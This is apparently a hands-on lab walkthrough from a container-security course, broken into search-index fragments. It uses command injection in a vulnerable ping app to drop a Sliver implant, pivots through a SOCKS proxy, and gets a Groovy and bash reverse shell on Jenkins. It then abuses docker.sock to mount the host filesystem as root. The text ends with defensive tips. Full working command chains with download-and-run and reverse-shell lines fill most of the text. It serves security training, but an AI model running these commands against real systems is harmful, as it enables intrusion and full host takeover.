\"workdir_redis:latest\" \"louislam/uptime-kuma:1\" \"lscr.io/linuxserver/heimdall:latest\" \"amir20/dozzle:latest\" \" debian:bookworm-slim \" \"portainer/portainer-ce:latest\" \"jc21/nginx-proxy-manager:latest\" \"bukuserver/bukuserver:latest\" \"jc21/mariadb-aria:latest\" Did you notice this list the following Tag: debian:bookworm-slim This tag indicates that we have a local Debian 12 image. Let's go ahead and use this to gain full system access. How can we gain full system access back to this host? Well we can do this by leveraging the docker.sock. Let's go ahead and build us a script for this in our attacker shell. Note The IP address of the host is needed for this as well Command lines export IP = 192.168.4.9 The command below will create a container with a command line that executes a bash shell back to our host. This shell runs interactive bash. We are also going to run chroot such that the directory we are in will be equivalent to the host. Command lines export CMD = \"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i &>/dev/tcp/ $IP /9997 0<&1'\\\\\\\"\\\"]\" Command lines export CONTAINER_NAME = hack-container The command below directs the Docker API to create a container with all the variables listed. This will not start the container but will create it. Command lines curl -s -X POST --unix-socket /var/run/docker.sock -d \"{\\\"Image\\\":\\\"debian:bookworm-slim\\\",\\\"cmd\\\": $CMD ,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create?name = ${ CONTAINER_NAME } Expected Results root@0222610d7c9e:/# export IP = 192.168.4.9 export CMD=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i &>/dev/tcp/$IP/9999 0<&1'\\\\\\\"\\\"]\" export CONTAINER_NAME=hack-container root@0222610d7c9e:/# curl -s -X POST --unix-socket /var/run/docker.sock -d \"{\\\"Image\\\":\\\"debian:bookworm-slim\\\",\\\"cmd\\\": $CMD ,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create?name = ${ CONTAINER_NAME } {\"Id\":\"9261f2fa60a494bf84635cb01e5ea5db30862a57ae1559e1e0402c85313b7ec1\",\"Warnings\":[]} We now have a container that we can start. Let's start that container. Command lines curl -s -X POST --unix-socket /var/run/docker.sock \"http://localhost/containers/ ${ CONTAINER_NAME } /start\" Expected Results root@0222610d7c9e:/# curl -s -X POST --unix-socket /var/run/docker.sock \"http://localhost/containers/ ${ CONTAINER_NAME } /start\" Going back to the terminal you were at you can see the output of the netcat container. Expected Results Listening on 0.0.0.0 9999 Connection received on 192.168.4.9 44974 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@dd7a4708e810:/# While the output will not displayed here there are a few commands that you can run to prove full system access. Run the following commands ps ls /home/sec588 Technically this container is not running by dropping privileges it is enough to prove the access we have. Now let's go ahead and turn off the Docker Containers that are running in the background. Command lines cd /opt/dockerlabs/lab6 Command lines docker compose down Expected Results sec588@slingshot ~ $ cd /opt/dockerlabs/lab6 sec588@slingshot /opt/dockerlabs/lab6 $ docker compose down [+] Running 11/11 \u2714 Container vulnapp Removed 4.4s \u2714 Container dozzle Removed 3.6s \u2714 Container jenkins Removed 4.3s \u2714 Container bukuserver Removed 3.9s \u2714 Container redis Removed 3.8s \u2714 Container uptime-kuma Removed 4.3s \u2714 Container portainer Removed 3.8s \u2714 Container heimdall Removed 4.3s \u2714 Container db Removed 4.1s \u2714 Network npm-networking Removed 0.2s The containers should now be stopped. This should help reduce system containers. Please make sure to also run: Command Lines sudo systemctl stop sliver Finally make sure to close all your windows as well as we will not need them for the next labs. Conclusion For the containers, there are multiple issues. The best way to run containers is through rootless single binary processes. Go makes the best candidate for this, but other languages can make binaries that do not rely on something other than system libraries or even environment shells to make the application work. Cgroups v2 would also make the system much more difficult to exploit as UID 0 in the container would not be UID 0 in the kernel. The final item would be around networking and the ability to firewall away network items. Putting this in a checklist makes sense. Defensive Tips The following are tips we explain to individuals Running without any binaries, minimal binaries, or even just a single binary Running without UID 0 Do not require privileges Firewall or IPTables on the host for each container (Read the Docker Firewalling Documentation) Use a docker.sock proxy to limit the number of API calls and the API requirements if you need to expose docker.sock Consistently scan for new binaries or execution within the container itself Maintain an SBOM Use some type of telemetry to see what processes are being executed within each container","title":"Container Lab"},{"location":"labs/containers/containers/#containers-lab","text":"","title":"Containers Lab"},{"location":"labs/containers/containers/#current-status","text":"","title":"Current Status"},{"location":"labs/containers/containers/#brief-intro","text":"This is a very lengthy lab, but this lab will be critical as we talk about orchestrating containers. It is all done locally but these tactics can be used in any manner. This lab will have you perform the following attacks. Leverage sliver to gain access to internal system shells. Use the shell to proxy through different internal containers using ProxyChains and Socks5 proxies. Leverage docker.sock to start a privileged container on the system itself. This lab is self contained and shows you how to walk through not all of the potential docker attacks but many of them. Danger This lab has you running several docker containers of which memory will be an issue. You may wish at this point to shut down your machine and boost the memory of the Virtual Machine from 2GB or 4GB of RAM.","title":"Brief Intro"},{"location":"labs/containers/containers/#requirements-for-this-lab","text":"There are not special requirements for this lab. This lab can be done completely offline.","title":"Requirements for This Lab"},{"location":"labs/containers/containers/#try-it-yourself","text":"The following are step-by-step instructions to extract the virtual machine and gain familiarity with the tools used in the class. Open up several terminals (you will need 4 with the VPN) Use the vulnapp to get a sliver shell Portscan through the sliver shell using nabuu and proxychains Get onto the Jenkins Server Once you are in the Jenkins Server get onto that container through the groovy shell functions Execute a new container through the docker.sock","title":"Try It Yourself"},{"location":"labs/containers/containers/#walkthrough","text":"","title":"Walkthrough"},{"location":"labs/containers/containers/#docker-assessing-newer-technologies","text":"To get started, you must have a minimum of three (3) terminals for this lab. The exercises in this lab will use new terminal windows. You can either use tabs or new terminal windows. Open a MATE Terminal Window by double-clicking on the MATE icon. You should have three additional terminals that we will now set the name for below Terminal 2 | Set Title Set the title to python Terminal 3 | Set Title Set the title to working Terminal | Set Title Set the title to sliver Note You can also open a terminal by pressing Ctrl + Alt + T Now let's bring up all our docker containers. From the working container. Danger Please note that this step takes up to 5 minutes to fully load the containers. The more resources you give you system the faster it will run. Command lines cd /opt/dockerlabs/lab6 Command lines docker compose up -d Expected Results sec588@slingshot ~ $ cd /opt/dockerlabs/lab6 sec588@slingshot /opt/dockerlabs/lab6 $ docker compose up -d [+] Building 0.0s (0/0) [+] Running 11/11 \u2714 Network npm-networking Created 0.2s \u2714 Container vulnapp Started 4.4s \u2714 Container dozzle Started 3.6s \u2714 Container jenkins Started 4.3s \u2714 Container bukuserver Started 3.9s \u2714 Container redis Started 3.8s \u2714 Container uptime-kuma Started 4.3s \u2714 Container portainer Started 3.8s \u2714 Container heimdall Started 4.3s \u2714 Container db Started 4.1s \u2714 Container npm Started 6.1s sec588@slingshot /opt/dockerlabs/lab6 $ To look at our localized containers, let's start with one called \"Heimdall\". Command lines firefox http://heimdall.local:8888 & Note The process id below of 12345 will be different for each student Expected Results sec588:slingshot:workdir$ firefox http://heimdall.local:8888 & [ 1 ] 12345 Heimdall is a dashboard where the administrators can hold several links. Think of it as a lovely home dashboard with additional integrations. Providing Heimdall with logins will populate the data in the dashboard for you in a preview window. For example, Jenkins runs jobs or containers that Portainer is managing. We are going to click on the vulnlab button. Once you have clicked on this Vulnapp Dashboard Widget, you will be taken to the \"Vulnerable Application Server\". Once you are in the Vulnerable Application, you can see a simple \"ping application\" with a form. Let's validate that this application is \"vulnerable.\" Notice that in the web application form, we will type the following value and hit enter: Form Input 127.0.0.1 Expected Results Now let's add additional Linux commands to validate the actual bug. The id command would be a command that we could run. Form Input 127.0.0.1;id Expected Results Did you notice the output? Let's try it from the command line to analyze better what is occurring. Switch back to the MATE Terminal. Run the following curl command within the MATE Terminal. Note Do this from the working Terminal Window Command Lines curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bid\" Expected Results sec588:slingshot:~$ curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bid\" <html> <head> </head> <script> function encode () { const str = document.getElemntById ( \"ping\" ) .value ; console.log ( str ) return str ; } </script> <form class = \"form-inline\" action = \"\" method = \"GET\" > <label for = \"ping\" >What do you want to ping?</label> <input type = \"ping\" id = \"ping\" placeholder = \"127.0.0.1\" name = \"ping\" > <input type = \"hidden\" name = \"form_submitted\" value = \"1\" /> <button type = \"submit\" >Submit</button> </form> <pre> Running ping -c 2 127 .0.0.1 ; id: PING 127 .0.0.1 ( 127 .0.0.1 ) 56 ( 84 ) bytes of data. 64 bytes from 127 .0.0.1: icmp_seq = 1 ttl = 64 time = 0 .027 ms 64 bytes from 127 .0.0.1: icmp_seq = 2 ttl = 64 time = 0 .036 ms --- 127 .0.0.1 ping statistics --- 2 packets transmitted, 2 received, 0 % packet loss, time 1031ms rtt min/avg/max/mdev = 0 .027/0.031/0.036/0.004 ms uid = 33 ( www-data ) gid = 33 ( www-data ) groups = 33 ( www-data ) Done Running </pre> </html> Look at what is occurring here: The command that is run is going to be reflected as: ping -c 2 127.0.0.1;id The command output is reflected below starting with: PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. After the ping command, we see the output of: uid=33(www-data) gid=33(www-data) groups=33(www-data) denoting command injection Bonus : There is also XSS on this page as the command is being reflected on the page without sanitization, and you are in control of the command. You may have noticed that this container runs the Apache process as www-data, typically uid/gid 33 on Debian. Given that we are not root, we may be limited in what we can do on this device. We can, however, execute commands; let us see how we can get access to the container without using docker commands. The first thing we will want to do is start a \"sliver\" server instance. First, we must extract the IP Address from the machine to run this attack. Note Do this from the working Terminal Window Command Lines ip addr show eth0 Danger The IP address for this VM at the time of this writing is 192.168.4.9 . Yours will be different . Please note this address as you will need it several times. Expected Results sec588:slingshot:workdir$ ip addr show eth0 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:b8:1a:a7 brd ff:ff:ff:ff:ff:ff altname enp2s1 altname ens33 inet 192.168.4.9 /24 metric 100 brd 192.168.4.255 scope global dynamic eth0 valid_lft 3587sec preferred_lft 3587sec We can store this value in a variable for use later. Command lines IP = $( ip addr show eth0 | grep inet | awk '{ print $2 }' | awk -F/ '{ print $1 }' ) Command lines echo $IP Expected Results sec588:slingshot:workdir$ $ IP = $( ip addr show eth0 | grep inet | awk '{ print $2 }' | awk -F/ '{ print $1 }' ) sec588:slingshot:workdir$ $ echo $IP 192.168.4.9 Next, we will run a Sliver and generate our implant. Please open a New MATE Terminal Window. We will call this window Sliver and this will be the Window name we refer to. Note You can also open a terminal by pressing Ctrl + Alt + T . Using the Terminal | Set Title ... of the menu call this window Sliver . Danger Please note that generating a sliver implant may take a long time and will also place the implant in the directory from which you ran sliver . For us, that directory will be /home/sec588/Coursefiles/workdir Command Lines cd /home/sec588/Coursefiles/workdir Command Lines sudo systemctl start sliver Command Lines sliver Command Lines mtls -l 9999 Command Lines generate --os linux --mtls 192.168.4.9 :9999 --skip-symbols Expected Results sec588:slingshot:~$ cd /home/sec588/Coursefiles/workdir sec588:slingshot:workdir$ sudo systemctl start sliver sec588:slingshot:workdir$ sliver Connecting to localhost:31337 ... \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d All hackers gain skulk [*] Server v1.5.35 - 1756fdfb62eb21346a3149fa34af127e34d4b799 [*] Welcome to the sliver shell, please type 'help' for options [*] Check for updates with the 'update' command sliver > mtls -l 9999 [*] Starting mTLS :9999 listener ... [*] Successfully started job #1 sliver > generate --os linux --mtls 192.168.4.9 :9999 --skip-symbols [*] Generating new linux/amd64 implant binary [*] Symbol obfuscation is disabled [*] Build completed in 1m5s [*] Implant saved to /home/sec588/Coursefiles/workdir/PROPOSED_DECREASE sliver > Note You may have realized that every Sliver implant, if not directed with a specific name, will have an upper cased implant name that will look oddly similar to specific threat actors. This is a go based binary implant that does not require any dependencies; we can serve it up and upload it to the container if we want. Let's use python to do this. The name of the binary that we created is PROPOSED_DECREASE in the workbook. But on your system your binary will have a completely different name. Just be sure you are aware of this. Let's rename the binary so that we can make all the lab steps a bit easier for us to provide. Note In the value below replace the word PROPOSED_DECREASE with the name of you binary. Command Lines BIN = \"PROPOSED_DECREASE\" Command Lines mv /home/sec588/Coursefiles/workdir/ $BIN /home/sec588/Coursefiles/workdir/nginx Expected Results BIN=\"PROPOSED_DECREASE\" Use the python MATE window to serve the implant with python . Note You can also open a terminal by pressing Ctrl + Alt + T . Using the Terminal | Set Title ... of the menu call this window Python . Command Lines cd /home/sec588/Coursefiles/workdir Command Lines python3 -m 'http.server' 9998 Expected Results sec588:slingshot:workdir$ python3 -m 'http.server' 9998 Serving HTTP on 0 .0.0.0 port 9998 ( http://0.0.0.0:9998/ ) ... What we need to know is how to move this file; you may have a few options. curl , wget , or simply nc . Note Do this from the working window Command Lines curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bwhich+curl\" Expected Results sec588:slingshot:~$ curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bwhich+curl\" <html> <head> </head> <script> function encode() { const str = document.getElemntById(\"ping\").value; console.log(str) return str; } </script> <form class=\"form-inline\" action=\"\" method=\"GET\"> <label for=\"ping\">What do you want to ping?</label> <input type=\"ping\" id=\"ping\" placeholder=\"127.0.0.1\" name=\"ping\"> <input type=\"hidden\" name=\"form_submitted\" value=\"1\" /> <button type=\"submit\">Submit</button> </form> <pre> Running ping -c 2 127.0.0.1;id: PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms --- 127.0.0.1 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1031ms rtt min/avg/max/mdev = 0.027/0.031/0.036/0.004 ms /usr/bin/curl Done Running </pre> </html> We have the curl binary. Let's move the binary over the container and run it in a directory allowing us to execute commands, for example, /tmp . We also want to make the binary executable and execute it. Tip Defender tip: Do you need this many binaries in a container? Note This particular lab step will require a few things that you will need to be aware of. + Do this from the working window + Remember to do this with the IP address of your host, you will need to change it in several places, the one we highlight is 192.168.4.9 which is not necessarily yours. + If you did this correctly, the output of $IP will reflect your IP. Command Lines echo $IP Command Lines curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bcurl+http:// $IP :9998/nginx+--output+/tmp/nginx%3Bchmod+777+/tmp/nginx%3B/tmp/nginx%26\" Expected Results sec588:slingshot:workdir$ curl curl \"http://vulnapp.local:8000/ping.php?form_submitted=1&ping=127.0.0.1%3Bcurl+http:// $IP :9998/nginx+--output+/tmp/nginx%3Bchmod+777+/tmp/nginx%3B/tmp/nginx%26\" < html > < head > </ head > < script > function encode () { const str = document . getElemntById ( \"ping\" ). value ; console . log ( str ) return str ; } </ script > < form class = \"form-inline\" action = \"\" method = \"GET\" > < label for = \"ping\" > What do you want to ping? </ label > < input type = \"ping\" id = \"ping\" placeholder = \"127.0.0.1\" name = \"ping\" > < input type = \"hidden\" name = \"form_submitted\" value = \"1\" /> < button type = \"submit\" > Submit </ button > </ form > < pre > Running ping -c 2 127.0.0.1;curl http://192.168.4.9:9998/nginx --output /tmp/nginx;chmod 777 /tmp/nginx;/tmp/nginx & : PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.097 ms --- 127.0.0.1 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1008ms rtt min/avg/max/mdev = 0.043/0.070/0.097/0.027 ms In the sliver window you should see a new connected session. For example: [*] Session 0c2551db PROPOSED_DECREASE - 172.18.0.4:37186 (2756fe0bb429) - linux/amd64 - Tue, 27 Jun 2023 23:24:36 UTC To interact with Sliver Sessions you need to use the use command. Sliver only shows the first 8 characters of the session ID and not the entire GUID. You can use tab completion to resolve it. Note To use tab completion use the Tab key. Additional note is that each and every Session ID is unique such that in our example 0c2551db will be different from your example. Note Do this from within sliver in the sliver Window. Command Lines use 0c2551d Tab Expected Results console sliver > use 0c2551db-9382-41f0-ac1f-42ceea6f09d3 Let's now look at the file system so you can see our binary, we can do this with sliver without needing an interactive shell. Command Lines ls /tmp Expected Results sliver (PROPOSED_DECREASE) > ls /tmp /tmp (2 items, 29.5 MiB) ======================== -rwxrwxrwx nginx 14.6 MiB Tue Jun 27 23:24:36 +0000 2023 We may also want to see Environment Variables that can give us hints to other systems. In many systems environment variables will give us: Other targets that are in the same system Authentication Key Material Database or other types of credentials with locations Let's use the built in env command in sliver to see the environment variables on the container. Command Lines env Extracted Results sliver (PROPOSED_DECREASE) > env HOSTNAME=2756fe0bb429 PHP_VERSION=8.2.7 APACHE_CONFDIR=/etc/apache2 PHP_INI_DIR=/usr/local/etc/php GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC PHP_LDFLAGS=-Wl,-O1 -pie PWD=/var/www/html APACHE_LOG_DIR=/var/log/apache2 LANG=C PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0 APACHE_PID_FILE=/var/run/apache2/apache2.pid PHPIZE_DEPS=autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2c PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz APACHE_RUN_GROUP=www-data APACHE_LOCK_DIR=/var/lock/apache2 SHLVL=1 PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 APACHE_RUN_DIR=/var/run/apache2 APACHE_ENVVARS=/etc/apache2/envvars APACHE_RUN_USER=www-data PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 _=/usr/bin/env The sliver system also has a socks5 proxy that we can use to pivot to other hosts on the system. To do this we need to start the socks5 proxy and we will then configure proxychains to perform the connectivity between a localhost and the remote system. Command Lines socks5 start Expected Results sliver (PROPOSED_DECREASE) > socks5 start [*] Started SOCKS5 127.0.0.1 1081 \u26a0\ufe0f In-band SOCKS proxies can be a little unstable depending on protocol Start a new Window called Working2 as your original Working window will be frozen with the sliver implant. From Working2 run the following commands. Note In some cases your docker network may not be 172.18.0.0/24. You can check with the command injection we have in teh vulnerable web server. Try injecting a command like hostname -I ! Command Lines proxychains naabu -host 172 .18.0.0/24 -port 80 ,8000,8080,50000,9000,5001,443,3001,6379 Expected Results sec588:slingshot:/$ proxychains naabu -host 172 .18.0.0/24 -port 80 ,8000,8080,50000,9000,5001,443,3001,6379 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 __ ___ ___ ___ _/ / __ __ / _ \\/ _ \\/ _ \\/ _ \\/ // / /_//_/\\_,_/\\_,_/_.__/\\_,_/ projectdiscovery.io [INF] Current naabu version 2.1.6 (latest) [INF] Running CONNECT scan with non root privileges [INF] Found 2 ports on host 172.18.0.5 (172.18.0.5) 172.18.0.5:8000 172.18.0.5:9000 [INF] Found 1 ports on host 172.18.0.8 (172.18.0.8) 172.18.0.8:5001 [INF] Found 1 ports on host 172.18.0.2 (172.18.0.2) 172.18.0.2:8080 [INF] Found 2 ports on host 172.18.0.11 (172.18.0.11) 172.18.0.11:443 172.18.0.11:80 [INF] Found 3 ports on host 172.18.0.1 (172.18.0.1) 172.18.0.1:8000 172.18.0.1:80 172.18.0.1:443 [INF] Found 1 ports on host 172.18.0.4 (172.18.0.4) 172.18.0.4:80 [INF] Found 2 ports on host 172.18.0.7 (172.18.0.7) 172.18.0.7:80 172.18.0.7:443 [INF] Found 2 ports on host 172.18.0.3 (172.18.0.3) 172.18.0.3:50000 172.18.0.3:8080 [INF] Found 1 ports on host 172.18.0.9 (172.18.0.9) 172.18.0.9:6379 [INF] Found 1 ports on host 172.18.0.10 (172.18.0.10) 172.18.0.10:3001 We can use a wordlist to do DNS enumeration from within the cluster environment, but instead let's do a slightly different manuver. Instead what we are going to do is use curl since we know some of these names. We could use http://ip:port but to expedite things, let's use a simple jenkins:8080 . Command Lines proxychains curl http://jenkins:8080 Expected Results sec588:slingshot:/$ proxychains curl http://jenkins:8080 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 127.0.0.1:1081 ... jenkins:8080 ... OK <html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'> Authentication required <!-- --> </body></html> Interestingly enough, what we have is jenkins and we also have a url to login. Most of the newer jenkins systems will have this. We could use a password bruteforcing tool such as BurpSuite to go after this system. Jenkins is an interesting target when it is within a container. How can jenkins produce a container when jenkins itself is in a container? This process is called docker in docker and it introduces a new vulnerability. The vulnerability is that the docker.sock is now exposed from within a container. Most docker.sock sockets are not secured by any authentication making this a very interesting target. Recall some of the vulnerabilities. docker.sock has no authentication Docker's daemon process is running as root, any container executed can have full root permissions on the box An attacker can abuse this to gain full root access on a host The login to this system would need to be bruteforce in order to obtain access. Password Bruteforcing with tools like Burp are something we do quite often, instead let's focus on the attack vector. To login into Jenkins use the following username and password: Username: sec588 Password: slingshotslingshot Note Remember the IP address here has to change from the IP Address listed to the IP address of your VM. Command lines firefox \"http://jenkins.local:8000/login?from=%2Fmanage%2Fscript\" Note Please make note that sometimes when you login the redirect takes you to the wrong place, for example: Change the URL at the top to http://jenkins.local : 8000 /manage/script to see the page: Open another Terminal, this terminal will be another Shell Catcher where we can use a netcat listener. Let's call this Window Shell Catcher . Note You can also open a terminal by pressing Ctrl + Alt + T . Using the Terminal | Set Title ... of the menu call this window Shell Catcher . Command lines nc -vnlp 9997 Expected Results sec588:slingshot:~$ nc -nvlp 9997 Listening on 0.0.0.0 9997 Now modify this below to reflect your IP address. The script below was created by Chris Frohoff and can be found on Github Form String host = \" 192.168.4.9 \" ; int port = 9997 ; String cmd = \"/bin/bash\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while ( ! s . isClosed ()){ while ( pi . available () > 0 ) so . write ( pi . read ()); while ( pe . available () > 0 ) so . write ( pe . read ()); while ( si . available () > 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); Once you click run, return to the screen that has the nc and see if you see a message that says Connection Received . Danger If you run the id command after you see the Connection received banner you should be able to run commands. A raw netcat shell like this does not reflect a prompt and this may confuse you. Let's now upgrade our shell by using sliver to get more access to the host. To do this we can run the following commands below to do this. Do this from the new shell you got. Danger Remember to change the IP address below to reflect your host IP. Tip Do this from the Shell Catcher Window Command lines export IP = 192.168.4.9 Command lines curl http:// ${ IP } :9998/nginx --output /tmp/nginx ; chmod 777 /tmp/nginx ; /tmp/nginx & At this point we should have a new shell from sliver in our example, recall each one is unique, so our example will be different from yours. Before leaving this window. Hit Ctrl + C and stop the nc process. We will then need to restart it, as we will be receiving a new shell soon. Command lines nc -nvlp 9997 Example Results sec588@slingshot ~/Coursefiles/workdir $ nc -nvlp 9997 Listening on 0 .0.0.0 9997 Connection received on 172 .18.0.7 41956 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) export IP = 192.168.4.9 curl http:// ${ IP } :9998/nginx --output /tmp/nginx ; chmod 777 /tmp/nginx ; /tmp/nginx & % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14 .8M 100 14 .8M 0 0 25 .5M 0 --:--:-- --:--:-- --:--:-- 25 .5M ^C sec588@slingshot ~/Coursefiles/workdir $ nc -nvlp 9997 Listening on 0 .0.0.0 9997 In sliver session we should have a new sessions that denoted by the string below. We can interact with the system with the use command just like before. [*] Session abcfdd98 PROPOSED_DECREASE - 192.168.4.205:58670 (0222610d7c9e) - linux/amd64 - Wed, 28 Jun 2023 01:04:31 UTC Command lines bash use abcfd Tab Expected Results ```console sliver (PROPOSED_DECREASE) > use abcfdd98-7e1b-4b9a-8454-14cf479aa180 [*] Active session PROPOSED_DECREASE (abcfdd98-7e1b-4b9a-8454-14cf479aa180) ``` Now let's use the ls command to make sure our implant is working correctly. Command lines ls Expected Results sliver (PROPOSED_DECREASE) > ls /tmp (4 items, 17.9 MiB) ======================== drwxr-xr-x hsperfdata_root <dir> Wed Jun 28 00:48:45 +0000 2023 drwx------ jetty-0_0_0_0-8080-war-_-any-1577770271696201865 <dir> Wed Jun 28 00:48:47 +0000 2023 -rwxrwxrwx nginx 14.6 MiB Wed Jun 28 01:04:31 +0000 2023 -rw-r--r-- winstone7225790913945196749.jar 3.2 MiB Wed Jun 28 00:48:46 +0000 2023 While it's not ideal in Windows to perform \"shell\" commands typically Linux systems in containers will not have EDR tools that can detect simple shell outputs. We can just use shell to interact with the system and do this without too much worry. Let's do that and install jq . We can install jq as jenkins is running as UID 0 . Command lines shell Command lines find ./ -name docker.sock Command lines apt install jq -y Note The errors in the ./proc directories will be completely random based on the system that your on. You can safely ignore these. Expected Results sliver (PROPOSED_DECREASE) > shell ? This action is bad OPSEC, are you an adult? Yes [*] Wait approximately 10 seconds after exit, and press <enter> to continue [*] Opening shell tunnel (EOF to exit) ... [*] Started remote shell with pid 104 root@0222610d7c9e:/# find ./ -name docker.sock ./run/docker.sock find: \u2018./proc/16/task/16/net\u2019: Invalid argument find: \u2018./proc/16/net\u2019: Invalid argument find: \u2018./proc/102/task/102/net\u2019: Invalid argument find: \u2018./proc/102/net\u2019: Invalid argument root@0222610d7c9e:/# apt install jq -y Reading package lists... Done Building dependency tree... Done Reading state information... Done The following additional packages will be installed: libjq1 libonig5 The following NEW packages will be installed: jq libjq1 libonig5 0 upgraded, 3 newly installed, 0 to remove and 0 not upgraded. Need to get 384 kB of archives. After this operation, 1148 kB of additional disk space will be used. Get:1 http://deb.debian.org/debian bullseye/main amd64 libonig5 amd64 6.9.6-1.1 [185 kB] Get:2 http://deb.debian.org/debian bullseye/main amd64 libjq1 amd64 1.6-2.1 [135 kB] Get:3 http://deb.debian.org/debian bullseye/main amd64 jq amd64 1.6-2.1 [64.9 kB] Fetched 384 kB in 0s (835 kB/s) debconf: delaying package configuration, since apt-utils is not installed Selecting previously unselected package libonig5:amd64. (Reading database ... 15729 files and directories currently installed.) Preparing to unpack .../libonig5_6.9.6-1.1_amd64.deb ... Unpacking libonig5:amd64 (6.9.6-1.1) ... Selecting previously unselected package libjq1:amd64. Preparing to unpack .../libjq1_1.6-2.1_amd64.deb ... Unpacking libjq1:amd64 (1.6-2.1) ... Selecting previously unselected package jq. Preparing to unpack .../archives/jq_1.6-2.1_amd64.deb ... Unpacking jq (1.6-2.1) ... Setting up libonig5:amd64 (6.9.6-1.1) ... Setting up libjq1:amd64 (1.6-2.1) ... Setting up jq (1.6-2.1) ... how do you interact with a socket file in linux? cURL provides the ability to use a socket file. To do this you need to specify the --unix-socket command and the URL will be http://localhost . What we are going to do is list the images that are pulled into the localhost already. We can do this by looking for the RepoTags key. Command lines curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.[] | .RepoTags' Note There will be other repositories in here that may not perfectly match, this is expected. Expected Results root@0222610d7c9e:/# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq '.[] | .RepoTags[]' \"workdir-jenkins:latest\" \"workdir_jenkins:latest\" \"workdir-vulnapp:latest\" \"workdir_vulnapp:latest\" \"workdir-redis:latest\" \"workdir_redis:latest\" \"louislam/uptime-kuma:1\" 